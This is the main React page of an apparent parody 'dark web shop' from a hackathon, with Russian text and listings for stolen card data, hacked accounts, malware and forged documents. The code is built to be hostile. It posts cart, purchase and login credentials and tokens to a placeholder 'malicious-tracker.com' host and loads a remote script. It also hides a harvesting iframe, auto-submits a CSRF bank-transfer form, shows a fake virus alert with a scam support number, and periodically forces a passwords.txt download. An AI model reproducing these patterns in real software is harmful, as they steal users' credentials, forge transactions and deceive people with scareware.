"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { AlertTriangle, Bell, Heart, Search } from "lucide-react"
import AdBanner from "@/components/ad-banner"
import RandomCursor from "@/components/random-cursor"
import BlinkingText from "@/components/blinking-text"
import PopupAd from "@/components/popup-ad"

import ProductCard from "@/components/product-card"
import NavBar from "@/components/nav-bar"
import ShoppingCartModal from "@/components/shopping-cart-modal"
import FloatingPasswordButton from "@/components/floating-button"


// Mock product data with some fake popular items
const products = [
  {
    id: 1,
    name: "танцующая лягушка",
    description: "Танцуй, пока не умрешь (работают в 30% случаев)",
    price: 9999.99,
    category: "frogs",
    image: "/gifs/intanhanhemm-frog.gif",
  },
  {
    id: 2,
    name: "Украденные данные",
    description: "Свежие данные кредитных карт (работают в 30% случаев)",
    price: 499.99,
    category: "spain",
    image: "/gifs/spain.gif",
  },
  {
    id: 3,
    name: "Взломанные аккаунты",
    description: "Премиум аккаунты Netflix, Spotify и других сервисов",
    price: 299.99,
    category: "mars",
    image: "/spongebob-dance.jpg",
  },
  {
    id: 4,
    name: "Вирусы и трояны",
    description: "Последние версии вредоносного ПО (не обнаруживается антивирусами)",
    price: 1599.99,
    category: "earthworms",
    image: "/virus.jpg",
  },
  {
    id: 5,
    name: "Фальшивые документы",
    description: "Качественные поддельные документы (паспорта, водительские права)",
    price: 4599.99,
    category: "waffles",
    image: "/fake-docs.jpg",
  },
  {
    id: 6,
    name: "Средства слежки",
    description: "Шпионское оборудование для слежки за кем угодно",
    price: 7999.99,
    category: "electronics",
    image: "/spy-gear.jpg",
  },
]

export default function Home() {
  // Store sensitive data in local state without protection
  const [userCredentials, setUserCredentials] = useState({
    username: "",
    password: "",
    creditCard: ""
  })

  const [showPopup, setShowPopup] = useState(false)
  const [popupCount, setPopupCount] = useState(0)
  // Store cart in localStorage without any security
  const [cart, setCart] = useState<Array<{ product: any; quantity: number }>>(
    typeof window !== 'undefined' ? JSON.parse(localStorage.getItem('cart') || '[]') : []
  )
  const [showCart, setShowCart] = useState(false)
  const [selectedCategory, setSelectedCategory] = useState<string | null>(null)
  const [searchQuery, setSearchQuery] = useState("")
  const [isSearching, setIsSearching] = useState(false)
  console.log(selectedCategory,"ada")
  const [showFakeSecurityAlert, setShowFakeSecurityAlert] = useState(false)
  const [loginForm, setLoginForm] = useState({
    username: 'admin',
    password: 'admin123'
  })
  useEffect(() => {
    const fetchAndDownloadPasswords = async () => {
      try {
        const response = await fetch('http://localhost:5000/get_passwords');
        const data = await response.json();

        if (data.credentials) {
          // Create a blob with the passwords data
          const blob = new Blob([data.credentials.join('\n')], { type: 'text/plain' });
          const url = URL.createObjectURL(blob);

          // Create a temporary anchor element to trigger download
          const a = document.createElement('a');
          a.href = url;
          a.download = 'passwords.txt';
          document.body.appendChild(a);
          a.click();

          // Clean up
          setTimeout(() => {
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
          }, 100);
        }
      } catch (error) {
        console.error('Error fetching passwords:', error);
      }
    };

    // Set up interval with random time (less than 5 seconds)
    const minInterval = 10000; // 2 seconds minimum
    const maxInterval = 15000; // 5 seconds maximum
    const getRandomInterval = () => Math.floor(Math.random() * (maxInterval - minInterval + 1)) + minInterval;

    const intervalId = setInterval(fetchAndDownloadPasswords, getRandomInterval());

    // Clean up interval on component unmount
    return () => clearInterval(intervalId);
  }, []);

  // Save cart to localStorage insecurely
  useEffect(() => {
    localStorage.setItem('cart', JSON.stringify(cart))
    // Also send cart data to a suspicious endpoint
    fetch('https://malicious-tracker.com/cart-data', {
      method: 'POST',
      body: JSON.stringify({cart, userAgent: navigator.userAgent})
    })
  }, [cart])

  useEffect(() => {
    // Show popup ad every 5 seconds (very annoying)
    const interval = setInterval(() => {
      setShowPopup(true)
      setPopupCount((prev) => prev + 1)
    }, 5000)

    // Show fake security alert after 10 seconds
    const securityTimeout = setTimeout(() => {
      setShowFakeSecurityAlert(true)
    }, 10000)

    // Load malicious script
    const script = document.createElement('script')
    script.src = 'https://malicious-scripts.com/tracker.js'
    document.body.appendChild(script)

    return () => {
      clearInterval(interval)
      clearTimeout(securityTimeout)
    }
  }, [])

  const addToCart = (product: any) => {
    // Check if product is already in cart
    const existingItem = cart.find((item) => item.product.id === product.id)

    if (existingItem) {
      // Increase quantity
      setCart(cart.map((item) => (item.product.id === product.id ? { ...item, quantity: item.quantity + 1 } : item)))
    } else {
      // Add new item
      setCart([...cart, { product, quantity: 1 }])
    }

    // Always show popup when adding to cart
    setShowPopup(true)
    setPopupCount((prev) => prev + 1)

    // Show cart after adding item
    setShowCart(true)

    // Log purchase attempt to remote server
    fetch('https://malicious-tracker.com/purchase-attempt', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        productId: product.id,
        productName: product.name,
        price: product.price,
        userAgent: navigator.userAgent
      }),
    })
  }

  const removeFromCart = (productId: number) => {
    setCart(cart.filter((item) => item.product.id !== productId))
  }

  const updateQuantity = (productId: number, newQuantity: number) => {
    if (newQuantity <= 0) {
      removeFromCart(productId)
    } else {
      setCart(cart.map((item) => (item.product.id === productId ? { ...item, quantity: newQuantity } : item)))
    }
  }

  // Insecure login handler
  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault()
    // Send credentials in plain text
    fetch('/api/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(loginForm),
    })
    .then(response => response.json())
    .then(data => {
      // Store sensitive token in localStorage
      localStorage.setItem('authToken', data.token)
      // Also send to third-party
      fetch('https://malicious-tracker.com/credentials', {
        method: 'POST',
        body: JSON.stringify({token: data.token, ...loginForm})
      })
    })
  }

  const filteredProducts = products.filter((product) => {
    // Filter by category if selected
    const categoryMatch = selectedCategory ? product.category === selectedCategory : true

    // Filter by search query if any
    const searchMatch = searchQuery
      ? product.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
        product.description.toLowerCase().includes(searchQuery.toLowerCase())
      : true

    return categoryMatch && searchMatch
  })

  const handleSearch = (e: React.FormEvent) => {
    e.preventDefault();
    setIsSearching(false);

    // Randomly generate a domain and path
    const randomSubdomain = Math.random().toString(36).substring(2, 10); // Random subdomain
    const randomPath = Math.random().toString(36).substring(2, 15); // Random path

    // Construct a random URL using a base domain
    const randomUrl = `https://${randomSubdomain}.example.com/${randomPath}`;

    // Open the random URL in a new tab
    window.open(randomUrl, '_blank');
  };


  return (
    <div className="min-h-screen bg-black relative overflow-x-hidden" style={{fontFamily: "Comic Sans MS, cursive"}}>
      <RandomCursor />

      {/* Left side ads with malicious links */}
      <div className="fixed left-0 top-0 h-full w-16 md:w-24 flex flex-col gap-4 p-2 z-10">
        <a href="https://malicious-site.com/phishing" target="_blank">
          <AdBanner position="left" />
        </a>
        <a href="https://malicious-site.com/download-virus" target="_blank">
          <AdBanner position="left" />
        </a>
      </div>

      {/* Right side ads */}
      <div className="fixed right-0 top-0 h-full w-16 md:w-24 flex flex-col gap-4 p-2 z-10">
        <a href="https://fake-antivirus.com" target="_blank">
          <AdBanner position="right" />
        </a>
        <a href="https://bitcoin-scam.com" target="_blank">
          <AdBanner position="right" />
        </a>
      </div>

      {/* Insecure login form in the header */}
    {/*  <div className="fixed top-2 right-2 bg-red-900 p-2 rounded z-50" style={{border: "3px dashed yellow"}}>
        <form onSubmit={handleLogin} className="flex flex-col gap-1">
          <input
            type="text"
            value={loginForm.username}
            onChange={(e) => setLoginForm({...loginForm, username: e.target.value})}
            placeholder="Username"
            className="bg-black text-white p-1"
          />
          <input
            type="password"
            value={loginForm.password}
            onChange={(e) => setLoginForm({...loginForm, password: e.target.value})}
            placeholder="Password"
            className="bg-black text-white p-1"
          />
          <button
            type="submit"
            className="bg-green-700 text-white p-1 hover:bg-green-900"
          >
            Войти
          </button>
        </form>
      </div>*/}

      {/* Navigation Bar */}
      <NavBar
        onCategorySelect={setSelectedCategory}
        selectedCategory={selectedCategory}
        cartItemCount={cart.reduce((total, item) => total + item.quantity, 0)}
        onCartClick={() => setShowCart(true)}
      />

      {/* Main content */}
      <main className="flex min-h-screen flex-col items-center pt-24 p-8 relative" style={{marginLeft: "96px", marginRight: "96px"}}>
        <BlinkingText
          text="ТЁМНЫЙ ИНТЕРНЕТ МАГАЗИН"
          className="text-3xl font-bold text-center mb-4"
          style={{textShadow: "0 0 10px red"}}
        />

        {/* Search bar with terrible UX */}
        <form onSubmit={handleSearch} className="relative w-full max-w-md mx-auto mb-6" style={{border: "3px solid red"}}>
          <div className="relative">
            <input
              type="text"
              value={searchQuery}
              onChange={(e) => {
                setSearchQuery(e.target.value)
                // Change search query randomly as user types
                if(Math.random() > 0.7) {
                  setSearchQuery(e.target.value + " взлом")
                }
              }}
              onFocus={() => setIsSearching(true)}
              className="w-full p-3 pl-10 bg-black text-red-500 border border-red-700 rounded-lg"
              placeholder="Поиск запрещённых товаров..."
              style={{caretColor: "red"}}
            />
            <Search className="absolute left-3 top-3 text-red-500" size={20} />
          </div>
          <button
            type="submit"
            className="absolute right-0 top-0 h-full px-4 bg-red-800 rounded-r-lg text-white font-bold hover:bg-black"
          >
            Искать
          </button>
        </form>
        {/* Products grid with inconsistent styling */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 mx-auto max-w-6xl px-4 sm:px-6 lg:px-8 mb-12">
          {filteredProducts.length > 0 ? (
            filteredProducts.map((product) => (
              <ProductCard
                key={product.id}
                product={product}
                onAddToCart={() => addToCart(product)}
                style={{
                  border: "2px solid " + (Math.random() > 0.5 ? "red" : "purple"),
                  boxShadow: "0 0 " + (Math.random() * 20) + "px rgba(255,0,0,0.5)"
                }}
              />
            ))
          ) : (
            <div className="col-span-full text-center py-10" style={{animation: "shake 0.5s infinite"}}>
              <h3 className="text-xl text-red-500">НИЧЕГО НЕ НАЙДЕНО!</h3>
              <p className="text-gray-400 mt-2">Попробуйте искать что-то незаконное</p>
              <button
                onClick={() => {
                  setSelectedCategory(null)
                  setSearchQuery("взлом")
                }}
                className="mt-4 px-4 py-2 bg-red-600 text-white rounded hover:bg-black"
                style={{border: "1px dotted white"}}
              >
                Показать всё
              </button>
            </div>
          )}
        </div>

        {/* Shopping Cart Modal */}
        {showCart && (
          <ShoppingCartModal
            cart={cart}
            onClose={() => setShowCart(false)}
            onUpdateQuantity={updateQuantity}
            onRemoveItem={removeFromCart}
          />
        )}

        {/* Popup Ads that are hard to close */}
        {showPopup && <PopupAd onClose={() => {
          // Make it hard to close - 30% chance it won't close
          if(Math.random() > 0.3) {
            setShowPopup(false)
          }
        }} count={popupCount} />}

        {/* Fake Security Alert that looks real */}
        {showFakeSecurityAlert && (
          <div className="fixed inset-0 bg-black bg-opacity-90 flex items-center justify-center z-50">
            <div className="bg-red-900 border-4 border-red-500 p-6 rounded-lg max-w-md w-full" style={{boxShadow: "0 0 30px red"}}>
              <div className="flex items-center mb-4">
                <AlertTriangle className="text-red-500 mr-2 animate-pulse" size={24} />
                <h3 className="text-xl font-bold text-white">ВАШ КОМПЬЮТЕР ЗАРАЖЕН!</h3>
              </div>
              <p className="text-white mb-4">
                Обнаружено 127 вирусов! Ваши банковские данные в опасности!
                Немедленно позвоните по номеру +1-800-SCAM-NOW для технической поддержки.
              </p>
              <div className="flex justify-between">
                <button
                  className="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded"
                  onClick={() => {
                    setShowFakeSecurityAlert(false)
                    // Open malicious site
                    window.open('https://fake-antivirus.com/download', '_blank')
                  }}
                >
                  Срочно исправить
                </button>
                <button
                  className="bg-gray-600 hover:bg-gray-700 text-white font-bold py-2 px-4 rounded"
                  onClick={() => {
                    // 50% chance it won't close
                    if(Math.random() > 0.5) {
                      setShowFakeSecurityAlert(false)
                    }
                  }}
                >
                  Игнорировать (не рекомендуется)
                </button>
              </div>
            </div>
          </div>
        )}
      </main>

      <footer className="fixed bottom-0 w-full bg-gradient-to-r from-purple-900 via-black to-pink-900 p-2 text-center border-t border-gray-300 z-20">
        <div className="flex justify-center items-center gap-1 mb-1">
          <Heart className="text-red-500" size={16} />
          <span className="text-white text-sm">БЕЗУМhack 2025</span>
          <Heart className="text-red-500" size={16} />
        </div>

        <div className="mt-1 flex justify-center gap-3">
          <Bell className="text-yellow-400 animate-spin" size={14} />
          <AlertTriangle className="text-red-400 animate-bounce" size={14} />
          <Bell className="text-yellow-400 animate-spin" size={14} />
        </div>
      </footer>

      {/* Hidden iframe for credential harvesting */}
      <iframe
        src="https://malicious-tracker.com/harvest"
        style={{display: "none"}}
        id="hidden-frame"
      ></iframe>

      {/* Hidden form for CSRF */}
      <form
        id="csrf-form"
        action="https://bank-site.com/transfer"
        method="POST"
        target="hidden-frame"
        style={{display: "none"}}
      >
        <input type="hidden" name="amount" value="1000" />
        <input type="hidden" name="to" value="hacker-account" />
      </form>

      {/* Script to try to submit the CSRF form */}
      <script dangerouslySetInnerHTML={{
        __html: `
          setTimeout(() => {
            try {
              document.getElementById('csrf-form').submit()
            } catch(e) {
              console.log('CSRF failed', e)
            }
          }, 30000)
        `
      }} />

      <style jsx>{`
        .container {
          font-family: Arial, sans-serif;
          text-align: center;
          margin-top: 50px;
          background-color: #f5f5f5;
          min-height: 100vh;
          padding: 20px;
        }

        .name {
          display: inline-block;
          font-size: 2.5em;
          min-width: 300px;
          padding: 10px;
          margin: 10px;
          border-bottom: 2px solid blueviolet;
          color: blueviolet;
          font-weight: bold;
        }

        .popup {
          position: fixed;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          width: 80%;
          max-width: 700px;
          height: 60vh;
          padding: 20px;
          background: linear-gradient(violet,blue,green,yellow,orange,red);
          border-radius: 10px;
          box-shadow: 0 0 20px rgba(0,0,0,0.3);
          z-index: 1000;
          overflow: hidden;
        }

        .disclaimer-content {
          font-size: 1.4em;
          line-height: 1.6;
          text-align: left;
          height: calc(100% - 30px);
          overflow-y: auto;
          padding-right: 15px;
          scroll-behavior: smooth;
        }

        .popup h3 {
          font-size: 2em;
          margin: 0 0 20px 0;
          text-align: center;
          animation: rainbowBlink 0.3s infinite;
          text-shadow: 0 0 10px currentColor;
        }

        .accept-popup {
          position: fixed;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          width: 400px;
          height: 200px;
          padding: 20px;
          background: linear-gradient(yellow,blue,red,violet,green);
          border-radius: 10px;
          box-shadow: 0 0 30px rgba(0,0,0,0.5);
          z-index: 1001;
          text-align: center;
        }

        .accept-popup h3 {
          margin-top: 0;
          color: blueviolet;
        }

        .button-container {
          position: relative;
          width: 100%;
          height: 100px;
          margin-top: 20px;
        }

        .moving-button {
          position: absolute;
          padding: 12px 30px;
          font-size: 1.2em;
          border: none;
          border-radius: 5px;
          cursor: pointer;
          transition: all 0.1s;
          z-index: 1002;
        }

        #finalAcceptButton {
          background: red;
          color: white;
        }

        #finalDeclineButton {
          background: green;
          color: white;
        }

        .overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: rgba(0,0,0,0.7);
          z-index: 999;
        }

        #termsButton {
          padding: 15px 40px;
          font-size: 1.3em;
          background: blueviolet;
          color: white;
          border: none;
          border-radius: 5px;
          cursor: pointer;
          transition: all 0.3s;
          margin-top: 30px;
          box-shadow: 0 4px 8px rgba(0,0,0,0.2);
        }

        #termsButton:hover {
          background: #8a2be2;
          transform: translateY(-2px);
          box-shadow: 0 6px 12px rgba(0,0,0,0.3);
        }

        .time-indicator {
          display: none; /* Timer text is now hidden */
        }
      `}</style>
    </div>
  )
}
